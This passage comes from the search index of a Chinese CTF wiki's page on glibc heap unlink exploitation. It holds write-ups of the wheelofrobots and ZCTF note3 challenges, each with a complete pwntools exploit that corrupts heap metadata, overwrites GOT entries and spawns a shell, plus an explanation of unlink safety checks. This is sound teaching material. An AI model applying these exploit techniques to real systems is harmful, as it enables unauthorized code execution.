\u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u3002 \u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570read_num\u662f\u8bfb\u53d6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u7684\u6570\u5b57\u3002 \u5177\u4f53\u529f\u80fd\u5982\u4e0b \u6dfb\u52a0\u8f6e\u5b50\uff0c\u4e00\u5171\u6709 6 \u4e2a\u8f6e\u5b50\u53ef\u4ee5\u9009\u62e9\u3002\u9009\u62e9\u8f6e\u5b50\u65f6\u4f7f\u7528\u51fd\u6570\u662fread_num\uff0c\u7136\u800c\u8be5\u51fd\u6570\u5728\u8bfb\u53d6\u7684\u65f6\u5019 read_num((char *)&choice, 5uLL); \u8bfb\u53d6\u7684\u957f\u5ea6\u662f 5 \u4e2a\u5b57\u8282\uff0c\u6070\u597d\u8986\u76d6\u4e86 bender_inuse \u7684\u6700\u4f4e\u5b57\u8282\uff0c\u5373\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6dfb\u52a0 Destructor \u8f6e\u5b50\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u5927\u5c0f\u68c0\u6d4b\u3002\u5982\u679c\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7 calloc(1uLL, 20 * v5); \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4 20*v5 \u6ea2\u51fa\uff0c\u4f46\u4e0e\u6b64\u540c\u65f6\uff0c destructor_size = v5 \u4ecd\u7136\u4f1a\u5f88\u5927\u3002 \u79fb\u9664\u8f6e\u5b50\uff0c\u76f4\u63a5\u5c06\u76f8\u5e94\u8f6e\u5b50\u79fb\u9664\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u5176\u5bf9\u5e94\u7684\u6307\u9488\u8bbe\u7f6e\u4e3a NULL \uff0c\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002 \u4fee\u6539\u8f6e\u5b50\u540d\u5b57\uff0c\u8fd9\u4e2a\u662f\u6839\u636e\u5f53\u65f6\u7533\u8bf7\u7684\u8f6e\u5b50\u7684\u5927\u5c0f\u7a7a\u95f4\u6765\u8bfb\u53d6\u6570\u636e\u3002\u4e4b\u524d\u6211\u4eec\u5df2\u7ecf\u8bf4\u8fc7 destructor \u8f6e\u5b50\u8bfb\u53d6\u5927\u5c0f\u65f6\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u8d1f\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u5728\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\u65f6 result = read(0, destructor, 20 * destructor_size); \uff0c\u5b58\u5728\u51e0\u4e4e\u4efb\u610f\u957f\u5ea6\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u542f\u52a8\u673a\u5668\u4eba\uff0c\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u968f\u673a\u5730\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u540d\u79f0\uff0c\u8fd9\u4e2a\u662f\u6211\u4eec\u96be\u4ee5\u63a7\u5236\u7684\u3002 \u7efc\u4e0a\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u4e3b\u8981\u5b58\u5728\u7684\u6f0f\u6d1e off-by-one \u4e0e\u6574\u6570\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4f7f\u7528\u524d\u9762\u7684off-by-one \u6f0f\u6d1e\u3002 \u5229\u7528\u601d\u8def \u00b6 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236 destructor_size \u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b501 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002 \u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002 \u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b501 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002 \u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 exit() patch \u4e3a\u4e00\u4e2a ret \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002 \u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002 \u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc\u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system \u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8shell\u3002 \u4ee3\u7801\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./wheelofrobots\" robots = ELF ( './wheelofrobots' ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./wheelofrobots\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def offset_bin_main_arena ( idx ): word_bytes = context . word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offset def add ( idx , size = 0 ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) if idx == 2 : p . recvuntil ( \"Increase Bender's intelligence: \" ) p . sendline ( str ( size )) elif idx == 3 : p . recvuntil ( \"Increase Robot Devil's cruelty: \" ) p . sendline ( str ( size )) elif idx == 6 : p . recvuntil ( \"Increase Destructor's powerful: \" ) p . sendline ( str ( size )) def remove ( idx ): p . recvuntil ( 'Your choice :' ) p . sendline ( '2' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) def change ( idx , name ): p . recvuntil ( 'Your choice :' ) p . sendline ( '3' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) p . recvuntil ( \"Robot's name: \\n \" ) p . send ( name ) def start_robot (): p . recvuntil ( 'Your choice :' ) p . sendline ( '4' ) def overflow_benderinuse ( inuse ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . send ( '9999' + inuse ) def write ( where , what ): change ( 1 , p64 ( where )) change ( 6 , p64 ( what )) def exp (): print \"step 1\" # add a fastbin chunk 0x20 and free it # so it is in fastbin, idx2->NULL add ( 2 , 1 ) # idx2 remove ( 2 ) # overflow bender inuse with 1 overflow_benderinuse ( ' \\x01 ' ) # change bender's fd to 0x603138, point to bender's size # now fastbin 0x20, idx2->0x603138->NULL change ( 2 , p64 ( 0x603138 )) # in order add bender again overflow_benderinuse ( ' \\x00 ' ) # add bender again, fastbin 0x603138->NULL add ( 2 , 1 ) # in order to malloc chunk at 0x603138 # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # it is at Robot Devil add ( 3 , 0x20 ) # trigger malloc, set tinny point to 0x603148 add ( 1 ) # wheels must <= 3 remove ( 2 ) remove ( 3 ) print 'step 2' # alloc Destructor size 60->0x50, chunk content 0x40 add ( 6 , 3 ) # alloc devil, size=20*7=140, bigger than fastbin add ( 3 , 7 ) # edit destructor's size to 1000 by tinny change ( 1 , p64 ( 1000 )) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64 ( 0 ) + p64 ( 0x20 ) + p64 ( fakechunk_addr - 0x18 ) + p64 ( fakechunk_addr - 0x10 ) + p64 ( 0x20 ) fakechunk = fakechunk . ljust ( 0x40 , 'a' ) fakechunk += p64 ( 0x40 ) + p64 ( 0xa0 ) change ( 6 , fakechunk ) # trigger unlink remove ( 3 ) print 'step 3' # make 0x6030F8 point to 0x6030E8 payload = p64 ( 0 ) * 2 + 0x18 * 'a' + p64 ( 0x6030E8 ) change ( 6 , payload ) print 'step 4' # make exit just as return write ( robots . got [ 'exit' ], 0x401954 ) print 'step 5' # set wheel cnt =3, 0x603130 in order to start robot write ( 0x603130 , 3 ) # set destructor point to puts@got change ( 1 , p64 ( robots . got [ 'puts' ])) start_robot () p . recvuntil ( 'New hands great!! Thx ' ) puts_addr = p . recvuntil ( '! \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) puts_addr = u64 ( puts_addr ) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] log . success ( 'libc base: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) # make free->system write ( robots . got [ 'free' ], system_addr ) # make destructor point to /bin/sh addr write ( 0x6030E8 , binsh_addr ) # get shell remove ( 6 ) p . interactive () pass if __name__ == \"__main__\" : exp () \u9898\u76ee \u00b6 DEFCON 2017 Qualifiers beatmeonthedl \u53c2\u8003 \u00b6 malloc@angelboy https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a note3 \u00b6 \u4ecb\u7ecd \u00b6 ZCTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u70b9\u662fsafe unlink\u7684\u5229\u7528\u3002 \u9898\u76ee\u4ecb\u7ecd \u00b6 \u9898\u76ee\u662f\u4e00\u4e2anotepad\uff0c\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u67e5\u770b\u7b14\u8bb0\u7684\u529f\u80fd 1.New note 2.Show note 3.Edit note 4.Delete note 5.Quit option--->> \u4fdd\u62a4\u5982\u4e0b\u6240\u793a Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial \u529f\u80fd\u6982\u8ff0 \u00b6 \u7a0b\u5e8fNew\u529f\u80fd\u7528\u6765\u65b0\u5efa\u7b14\u8bb0\uff0c\u7b14\u8bb0\u7684\u5927\u5c0f\u53ef\u4ee5\u81ea\u5b9a\u53ea\u8981\u5c0f\u4e8e1024\u5b57\u8282\u3002 int new() { puts(\"Input the length of the note content:(less than 1024)\"); size = get_num(); if ( size < 0 ) return puts(\"Length error\"); if ( size > 1024 ) return puts(\"Content is too long\"); heap_ptr = malloc(size); puts(\"Input the note content:\"); my_read(heap_ptr, size, '\\n'); bss_ptr[i] = heap_ptr; current_ptr[i + 8LL] = size; current_ptr[0] = bss_ptr[i]; return printf(\"note add success, the id is %d\\n\", i); } \u6240\u6709\u7684\u7b14\u8bb0malloc\u51fa\u6765\u7684\u6307\u9488\u5b58\u653e\u5728bss\u4e0a\u5168\u5c40\u6570\u7ec4bss_ptr\u4e2d\uff0c\u8fd9\u4e2a\u6570\u7ec4\u6700\u591a\u53ef\u4ee5\u5b58\u653e7\u4e2aheap_ptr\u3002 \u800c\u4e14heap_ptr\u5bf9\u5e94\u7684size\u4e5f\u88ab\u653e\u5728bss_ptr\u6570\u7ec4\u4e2d\u3002current_ptr\u8868\u793a\u5f53\u524d\u7b14\u8bb0\uff0cbss\u5e03\u5c40\u5982\u4e0b\u3002 .bss: current_ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size Show\u529f\u80fd\u662f\u65e0\u7528\u7684\u529f\u80fd\uff0cedit\u548cdelete\u53ef\u4ee5\u7f16\u8f91\u548c\u91ca\u653enote\u3002 \u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u5b58\u5728\u4e8eedit\u529f\u80fd\u4e2d\uff0c\u8fd9\u91cc\u9762\u5728\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684id\u53f7\u4e4b\u540e\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c\u8f93\u5165\u7684id\u662f\u8d1f\u6570\u7684\u8bdd\u4f9d\u7136\u53ef\u4ee5\u6267\u884c\u3002 \u5728get_num\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u8d1f\u6570\u3002 int edit() { id = get_num(); data_ptr = ptr[id]; if ( data_ptr ) { puts(\"Input the new content:\"); my_read(ptr[id], current_ptr[id + 8], '\\n'); current_ptr[0] = ptr[id]; data_ptr = puts(\"Edit success\"); } } \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97edit\u8bfb\u5165cuurent_ptr\uff0c\u4f7f\u7528\u7684size\u662fnote7_ptr .bss: current_ptr <== edit ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr <== size note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size \u9996\u5148\u521b\u5efa8\u4e2anote\uff0c\u7136\u540eedit note3\u4f7fcurrent_ptr\u6307\u5411note3\uff0c\u4e4b\u540e\u4f7f\u7528-1\u6ea2\u51fanote3 new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') edit(3,'a') edit(-9223372036854775808,data); \u6211\u4eec\u4f7f\u7528\u7684\u6ea2\u51fa\u6570\u636e\u662f\u7528\u4e8e\u6784\u9020\u4e00\u4e2afake chunk\u6765\u5b9e\u73b0safe unlink\u7684\u5229\u7528\uff0c\u5177\u4f53\u7684\u539f\u7406\u53ef\u4ee5\u770b\u8fd9\u4e00\u7ae0\u8282\u7684\u8bb2\u89e3\u3002 data = '' data += p64(0) + p64(512+1) #fake chunk header data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk data += 'A'*(512-32) data += p64(512) + p64(512+16) \u4e4b\u540e\u91ca\u653enote4\uff0cnote3\u4e0enote4\u5c31\u4f1a\u5408\u5e76\u3002note3_ptr\u4f1a\u6307\u5411note0_ptr\u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u4e0d\u65ad\u7684\u4fee\u6539note0_ptr\u7684\u503c\u548cedit note0\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6570\u636e\u3002 \u4f46\u662f\u9898\u76ee\u6ca1\u6709\u63d0\u4f9bshow\u529f\u80fd\uff0c\u6240\u4ee5\u65e0\u6cd5\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6cc4\u6f0f\u6570\u636e\u3002 \u8fd9\u91cc\u91c7\u7528\u7684\u529e\u6cd5\u662f\u628afree\u7684got\u8868\u6539\u4e3aprintf\u7684\u503c\uff0c\u7136\u540e\u5728bbs\u4e2d\u4e00\u5757\u7a7a\u767d\u7684\u533a\u57df\u5199\u5165\"%x\"\u3002 \u8fd9\u6837\u5f53free\u8fd9\u5757\u533a\u57df\uff08\u8fd9\u5757\u533a\u57df\u5728ptr_array\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\u7ed9free\uff09\uff0c\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u6808\u4e2d\u7684\u6570\u636e\u3002 \u901a\u8fc7\u6808\u4e2d\u7684libc\u5730\u5740\u6c42\u51fasystem\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u5730\u5740\u5199\u83b7\u5f97shell free(4) edit(3,free_got) edit(0,printf_plt) edit(3,p64(0x6020e8)) edit(0,'%llx.'*30) \u5b8c\u6210\u7684exp\u5982\u4e0b #!/usr/bin/python # -*- coding: utf-8 -*- from pwn import * import time def malloc(size,data): print conn.recvuntil('>>') conn.sendline('1') print conn.recvuntil('1024)') conn.sendline(str(size)) print conn.recvuntil('content:') conn.sendline(data) print conn.recvuntil('\\n') def edit(id,data): print conn.recvuntil('>>') conn.sendline('3') print conn.recvuntil('note:') conn.sendline(str(id)) print conn.recvuntil('ent:') conn.sendline(data) print conn.recvuntil('success') def free(id): print conn.recvuntil('>>') conn.sendline('4') print conn.recvuntil('note:') conn.sendline(str(id)) print conn.recvuntil('success') #conn = remote('127.0.0.1',9999) conn = remote('115.28.27.103',9003) free_got = p64(0x602018) puts_got = p64(0x602020) stack_got = p64(0x602038) printf_got = p64(0x602030) exit_got = p64(0x602078) printf_plt = p64(0x400750) puts_plt = p64(0x400730) #libcstartmain_ret_off = 0x21b45 #sys_off = 0x414f0 libcstartmain_ret_off = 0x21ec5 sys_off = 0x46640 # 1. int overflow lead to double free intoverflow = -9223372036854775808 malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,p64(0x400ef8)) malloc(512,'/bin/sh\\0') # 2. make a fake chunk and modify the next chunk's pre size fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + 'A'*(512-32) + p64(512) + p64(512+16) edit(3,'aaaaaa') edit(intoverflow,fakechunk) # 3. double free free(4) # 4. overwrite got edit(3,free_got) edit(0,printf_plt+printf_plt) # 5. leak the stack data edit(3,p64(0x6020e8)) edit(0,'%llx.'*30) #free->puts print conn.recvuntil('>>') conn.sendline('4') print conn.recvuntil('note:') conn.sendline(str(0)) #time.sleep(0.3) ret = conn.recvuntil('success') print ret # 6. calcuate the system's addr libcstart = ret.split('.')[10] libcstart_2 = int(libcstart,16) - libcstartmain_ret_off print 'libc start addr:',hex(libcstart_2) system_addr = libcstart_2 + sys_off print 'system_addr:',hex(system_addr) # 7. overwrite free's got edit(3,free_got) edit(0,p64(system_addr)+printf_plt) # 8. write argv edit(3,p64(0x6020d0)) edit(0,'/bin/sh\\0') # 9. exploit print conn.recvuntil('>>') conn.sendline('4') print conn.recvuntil('note:') conn.sendline(str(0)) sleep(0.2) conn.interactive()","title":"Unlink"},{"location":"pwn/heap/unlink/#unlink","text":"","title":"Unlink"},{"location":"pwn/heap/unlink/#_1","text":"\u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u8fdb\u884c unlink chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002 \u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff0c\u7136\u540e\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b \u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002","title":"\u539f\u7406"},{"location":"pwn/heap/unlink/#unlink_1","text":"\u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6ca1\u6709\u4ee5\u4e0b\u7684\u4ee3\u7801\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b \uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50 \u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08 \u6bd4\u5982\u6ea2\u51fa \uff09\u5c06 Nextchunk \u7684 fd \u548c bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eecfree(Q)\u65f6 glibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk\u3002 \u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76\u3002 \u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76\u3002 \u7ee7\u800c\u5bf9 nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c\u3002 \u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b FD=P->fd = target addr -12 BK=P->bk = expect value FD->bk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value BK->fd = FD\uff0c\u5373*(expect value +8) = FD = target addr-12 \u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002 \u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002","title":"\u53e4\u8001\u7684 unlink"},{"location":"pwn/heap/unlink/#unlink_2","text":"\u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002 \u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5 // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ \u6b64\u65f6 FD->bk = target addr - 12 + 12=target_addr BK->fd = expect value + 8 \u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u53ef\u7528\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u5f97 expect value+8 \u4ee5\u53ca target_addr \u7b49\u4e8e P\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c *P= expect value = P - 8 *P = target addr -12 = P - 12 \u5373\u6539\u5199\u4e86\u6307\u9488 P \u7684\u5185\u5bb9\uff0c\u5c06\u5176\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 